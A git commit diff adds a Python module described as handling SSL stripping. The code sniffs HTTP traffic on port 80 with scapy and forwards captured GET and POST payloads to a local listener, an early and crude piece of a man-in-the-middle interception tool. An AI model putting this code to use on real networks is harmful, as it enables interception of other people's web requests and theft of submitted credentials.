ed588b41676a1a1e1f516881186308b6f5868526
Brikkel@Crush <rikvanbrakel24@gmail.com>
2023-05-31 15:32:59 +0200

    added forwarding to other port layout

--- functions/ssl.py
+++ functions/ssl.py
@@ -1,1 +1,26 @@
 '''This package contains everything related to SSL stripping'''
+
+from scapy.all import TCP, sniff
+import socket
+
+# Create a socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Bind the socket to the local host and port 25518
+s.bind(('localhost', 25518))
+
+# Listen for incoming connections
+s.listen(1)
+
+def packet_callback(packet):
+    if packet[TCP].payload:
+        data = str(packet[TCP].payload)
+        if 'GET' in data or 'POST' in data:
+            # Accept a connection
+            conn, addr = s.accept()
+            print(f"Connected by {addr}")
+            # Forward the data
+            conn.sendall(data.encode())
+            conn.close()
+
+sniff(filter='tcp port 80', prn=packet_callback, store=0)
